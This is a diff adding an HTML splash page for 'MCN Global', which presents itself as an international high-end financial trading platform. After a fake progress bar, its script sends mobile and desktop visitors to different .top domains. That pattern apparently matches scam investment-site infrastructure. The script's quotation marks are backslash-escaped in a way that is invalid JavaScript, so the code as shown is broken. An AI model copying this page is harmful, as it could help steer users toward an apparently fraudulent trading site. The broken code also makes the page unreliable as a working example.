@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MCN Global</title>
+  <meta name="description" content="MCN Global - 國際高端金融交易平台">
+  <link rel="icon" href="/logo.png" type="image/x-icon">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #ffffff;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    .loading {
+      text-align: center;
+      opacity: 0;
+      animation: fadeIn 1.5s forwards;
+    }
+    .loading img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+    .loading h1 {
+      font-size: 20px;
+      color: #333333;
+      margin-bottom: 30px;
+    }
+    .progress-container {
+      width: 80%;
+      height: 6px;
+      background: #e0e0e0;
+      margin: 0 auto;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #0a2342, #f5b700);
+      animation: loadingBar 2s forwards;
+    }
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+    @keyframes loadingBar {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+  </style>
+  <script>
+    document.addEventListener(\"DOMContentLoaded\", function() {
+      setTimeout(function() {
+        if (/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+          window.location.href = \"http://mcnglobalex.top/#/pages/home/index\";
+        } else {
+          window.location.href = \"http://mcnglobaltld.top/\";
+        }
+      }, 2100);
+    });
+  </script>
+</head>
+<body>
+  <div class="loading">
+    <img src="/logo.png" alt="MCN Global Logo">
+    <h1>正在載入，請稍候...</h1>
+    <div class="progress-container">
+      <div class="progress-bar"></div>
+    </div>
+  </div>
+</body>
+</html>
